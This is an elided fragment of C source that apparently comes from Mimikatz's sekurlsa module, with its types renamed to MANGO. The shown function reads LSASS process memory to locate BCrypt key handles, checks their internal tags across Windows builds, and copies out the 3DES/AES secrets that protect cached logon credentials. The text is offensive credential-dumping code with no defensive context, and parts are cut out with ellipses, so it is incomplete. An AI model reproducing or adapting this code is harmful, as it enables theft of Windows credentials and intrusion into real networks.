...
MANGO_BCRYPT_GEN_KEY k3Des, kAes;
...
BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PMANGO_BCRYPT_GEN_KEY pGenKey)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	MANGO_BCRYPT_HANDLE_KEY hKey; PMANGO_HARD_KEY pHardKey;
	PVOID buffer; SIZE_T taille; LONG offset;

	if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_8)
	{
		taille = sizeof(MANGO_BCRYPT_KEY);
		offset = FIELD_OFFSET(MANGO_BCRYPT_KEY, hardkey);
	}
	else if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
	{
		taille = sizeof(MANGO_BCRYPT_KEY8);
		offset = FIELD_OFFSET(MANGO_BCRYPT_KEY8, hardkey);
	}
	else
	{
		taille = sizeof(MANGO_BCRYPT_KEY81);
		offset = FIELD_OFFSET(MANGO_BCRYPT_KEY81, hardkey);
	}
	...
	if(buffer = LocalAlloc(LPTR, taille))
	{
		...
		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
		{
			...
			if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
			{
				...
				if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(MANGO_BCRYPT_HANDLE_KEY)) && hKey.tag == 'UUUR')
				{
					aLocalMemory.address = buffer; aLsassMemory->address = hKey.key;
					if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille) && ((PMANGO_BCRYPT_KEY) buffer)->tag == 'MSSK') // same as 8
					{
						pHardKey = (PMANGO_HARD_KEY) ((PBYTE) buffer + offset);
						if(aLocalMemory.address = LocalAlloc(LPTR, pHardKey->cbSecret))
						{
							aLsassMemory->address = (PBYTE) hKey.key + offset + FIELD_OFFSET(MANGO_HARD_KEY, data);
